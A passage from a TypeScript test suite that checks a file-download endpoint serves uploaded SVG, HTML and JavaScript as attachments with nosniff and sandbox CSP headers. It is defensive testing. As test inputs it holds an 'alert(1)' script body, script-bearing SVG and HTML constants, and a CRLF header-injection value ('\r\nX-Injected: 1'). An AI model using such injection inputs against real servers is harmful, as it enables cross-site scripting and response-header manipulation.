    return makeApp().request('/api/server/srv-1/uploads/abc123/download', { headers: { Authorization: 'Bearer test' } });
  }
  async function downloadStreamed(mime: string, filename: string, body: string) {
    const app = makeApp();
    sendFileTransferRequestMock.mockImplementationOnce((_requestId: string, message: unknown) => {
      const uploadUrl = new URL((message as { uploadUrl: string }).uploadUrl);
      void app.request(`${uploadUrl.pathname}${uploadUrl.search}`, {
        method: 'PUT',
        headers: { 'Content-Type': mime, 'Content-Length': String(Buffer.byteLength(body)), 'x-imcodes-filename': encodeURIComponent(filename) },
        body,
      });
      return new Promise(() => {});
    });
    return app.request('/api/server/srv-1/uploads/abc123/download', { headers: { Authorization: 'Bearer test' } });
  }
  const expectLocked = (res: Response) => {
    expect(res.headers.get('x-content-type-options')).toBe('nosniff');
    expect(res.headers.get('content-security-policy')).toBe("sandbox; default-src 'none'; img-src 'self' data:");
  };

  it.each([
    ['image/svg+xml', 'evil.svg', SCRIPT_SVG],
    ['IMAGE/SVG+XML; charset=utf-8', 'evil2.svg', SCRIPT_SVG],
    ['text/html', 'evil.html', SCRIPT_HTML],
    ['application/xhtml+xml', 'evil.xhtml', SCRIPT_HTML],
    ['text/xml', 'evil.xml', SCRIPT_SVG],
    ['application/javascript', 'evil.js', 'alert(1)'],
    ['application/pdf', 'doc.pdf', '%PDF-1.4'],
    ['image/x-surprise', 'odd.img', 'x'],
    [undefined, 'unknown.bin', 'x'],
    ['not a mime\r\nX-Injected: 1', 'weird.bin', 'x'],
  ] as const)('serves %s as a download, never inline, with nosniff and the sandbox CSP (inline path)', async (mime, filename, body) => {
    const res = await downloadInline(mime, filename, body);
    expect(res.status).toBe(200);
    expect(res.headers.get('content-disposition')).toMatch(/^attachment;/);
    expectLocked(res);
    expect(res.headers.get('x-injected')).toBeNull();
    await expect(res.text()).resolves.toBe(body);
  });

  it.each([
    ['image/svg+xml', 'evil.svg', SCRIPT_SVG],
    ['text/html', 'evil.html', SCRIPT_HTML],
  ] as const)('serves %s through the streaming relay as a download too', async (mime, filename, body) => {
    const res = await downloadStreamed(mime, filename, body);
    expect(res.status).toBe(200);
    expect(res.headers.get('content-disposition')).toMatch(/^attachment;/);
    expectLocked(res);
    await expect(res.text()).resolves.toBe(body);
  });

  it('keeps the SVG labelled as an image so an <img> preview still renders it (the disposition does not affect <img>)', async () => {
    const res = await downloadInline('image/svg+xml', 'logo.svg', SCRIPT_SVG);
    expect(res.headers.get('content-type')).toContain('image/svg+xml');
    expect(res.headers.get('content-disposition')).toMatch(/^attachment; filename="logo.svg"/);
  });

  it.each(['image/png', 'image/jpeg', 'image/gif', 'image/webp', 'image/avif', 'image/bmp', 'IMAGE/PNG'])('keeps %s inline for previews (inline path and streaming relay)', async (mime) => {
    const inline = await downloadInline(mime, 'pic.img', 'bytes');
    expect(inline.headers.get('content-disposition')).toMatch(/^inline;/);
    expect(inline.headers.get('content-type')).toBe(mime);
    expectLocked(inline);
    const streamed = await downloadStreamed(mime, 'pic.img', 'bytes');
    expect(streamed.headers.get('content-disposition')).toMatch(/^inline;/);
    expectLocked(streamed);
  });

  it('ordinary files still download as attachments with their name intact (including a non-ASCII one)', async () => {
    const zip = await downloadInline('application/zip', 'bundle.zip', 'PK');
    expect(zip.headers.get('content-type')).toBe('application/zip');
    expect(zip.headers.get('content-disposition')).toMatch(/^attachment; filename="bundle.zip"/);
    const text = await downloadInline('text/plain', '说明.txt', 'hello');
    expect(text.headers.get('content-disposition')).toContain("filename*=UTF-8''%E8%AF%B4%E6%98%8E.txt");
  });
});
